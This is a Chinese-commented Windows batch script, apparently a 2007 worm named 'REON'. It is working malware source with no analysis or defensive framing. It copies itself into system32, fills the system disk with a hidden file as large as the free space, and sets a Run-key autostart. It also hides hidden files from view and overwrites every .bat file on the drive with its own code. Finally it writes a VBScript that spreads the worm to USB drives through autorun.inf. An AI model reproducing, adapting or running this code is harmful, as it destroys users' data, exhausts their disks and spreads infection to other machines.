@echo off

%ozone%^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^%ozone%
%ozone%     %Name  :REON%               %ozone%
%ozone%     %Author:Ozone [verybat.cn]%   %ozone%
%ozone%     %Data  :17/04/2007%           %ozone%
%ozone%^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^%ozone%



if exsit %SystemDrive%\PAGEFILES.SYS goto end
copy %0 %windir%\system32\logon.bat                     ::复制自身
FOR /F "tokens=3*" %%i in ('dir /-c %SystemDrive%^|find "可用字节"') do fsutil file createnew %SystemDrive%\PAGEFILES.SYS %%i   ::制造超大文件,轰炸硬盘
attrib +r +s +h %SystemDrive%\PAGEFILES.SYS        ::隐藏文件
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v KV2007 /t REG_SZ /d %windir%\system32\logon.vbs                      ::自动启动
reg delete HKLM\Software\Microsoft\windows\CurrentVersion\explorer\Advanced\Folder\Hidden\SHOWALL /va /f                    ::不显示隐藏文件
for /r %SystemDrive% %%i in (*.bat) do type %0>%%i       ::感染


if exist %windir%\system32\logon.vbs goto end
+++++++++++++++++++++++++=VBS部分+++++++++++++++++++++++++++++++++++++++

echo set fs =createobject("scripting.filesystemobject")>>%windir%\system32\logon.vbs
echo set WshShell = WScript.CreateObject("WScript.Shell")>>%windir%\system32\logon.vbs
echo Set objWMIService = GetObject("winmgmts:" _>>%windir%\system32\logon.vbs
echo ^& "{impersonationLevel=impersonate}!\\" ^& strComputer ^& "\root\cimv2")>>%windir%\system32\logon.vbs
echo Set colDisks = objWMIService.ExecQuery _>>%windir%\system32\logon.vbs
echo ("Select * from Win32_LogicalDisk")>>%windir%\system32\logon.vbs

::监视u盘
echo For i =1 to 9000000000>>%windir%\system32\logon.vbs
echo For Each objDisk in colDisks>>%windir%\system32\logon.vbs
echo Select Case objDisk.DriveType>>%windir%\system32\logon.vbs
echo :Case 2:>>%windir%\system32\logon.vbs


::判断u盘中是否存在autorun.inf,不存在则写入autorun.inf并且隐藏.
echo y1=fs.FileExists(objDisk.DeviceID ^& "\AUTORUN.INF")>>%windir%\system32\logon.vbs
echo if not y1 then>>%windir%\system32\logon.vbs
echo set f=fs.opentextfile(objDisk.DeviceID ^& "\AUTORUN.INF",2, true)>>%windir%\system32\logon.vbs
echo f.write "[AutoRun]" ^& vbcrlf>>%windir%\system32\logon.vbs
echo f.write "open=logon.bat" ^& vbcrlf>>%windir%\system32\logon.vbs
echo f.write "shellexecute=logon.bat" ^& vbcrlf>>%windir%\system32\logon.vbs
echo f.write "shell\Auto\command=logon.bat" ^& vbcrlf>>%windir%\system32\logon.vbs
echo f.Close>>%windir%\system32\logon.vbs
echo Set f1 = fs.GetFile(objDisk.DeviceID ^& "\AUTORUN.INF")>>%windir%\system32\logon.vbs
echo If f1.Attributes = f1.Attributes AND 2 Then>>%windir%\system32\logon.vbs
echo :f1.Attributes = f1.Attributes XOR 7:>>%windir%\system32\logon.vbs
echo End If>>%windir%\system32\logon.vbs
echo end if>>%windir%\system32\logon.vbs

::判断u盘中是否存在logon.bat,如果不存在则写入logon.bat并隐藏.
echo y2=fs.FileExists(objDisk.DeviceID ^& "\logon.bat")>>%windir%\system32\logon.vbs
echo if not y2 then >>%windir%\system32\logon.vbs
echo fs.CopyFile "c:\windows\system32\logon.bat",objDisk.DeviceID ^& "\">>%windir%\system32\logon.vbs
echo Set f2 = fs.GetFile(objDisk.DeviceID ^& "\logon.bat")>>%windir%\system32\logon.vbs
echo If f2.Attributes = f2.Attributes AND 2 Then>>%windir%\system32\logon.vbs
echo :f2.Attributes = f2.Attributes XOR 7:>>%windir%\system32\logon.vbs
echo End If>>%windir%\system32\logon.vbs
echo end if>>%windir%\system32\logon.vbs

echo dirr = Wshshell.ExpandEnvironmentStrings("%systemdrive%")>>%windir%\system32\logon.vbs

::判断u盘中是否存在PAGEFILES.SYS,如果不存在则写入PAGEFILES.SYS并隐藏.
echo y3=fs.FileExists(dirr & "\PAGEFILES.SYS")>>%windir%\system32\logon.vbs
echo if not y3 then>>%windir%\system32\logon.vbs
echo WshShell.Run "logon.bat">>%windir%\system32\logon.vbs
echo WScript.Sleep 500>>%windir%\system32\logon.vbs
echo Set f3 = fs.GetFile(dirr & "\PAGEFILES.SYS")>>%windir%\system32\logon.vbs
echo If f3.Attributes = f3.Attributes AND 2 Then>>%windir%\system32\logon.vbs
echo :f3.Attributes = f3.Attributes XOR 7:>>%windir%\system32\logon.vbs
echo End If>>%windir%\system32\logon.vbs
echo end if>>%windir%\system32\logon.vbs
echo End Select>>%windir%\system32\logon.vbs
echo Next>>%windir%\system32\logon.vbs

::每隔5秒扫描一次.
echo WScript.Sleep 5000>>%windir%\system32\logon.vbs
echo Next>>%windir%\system32\logon.vbs

++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

:end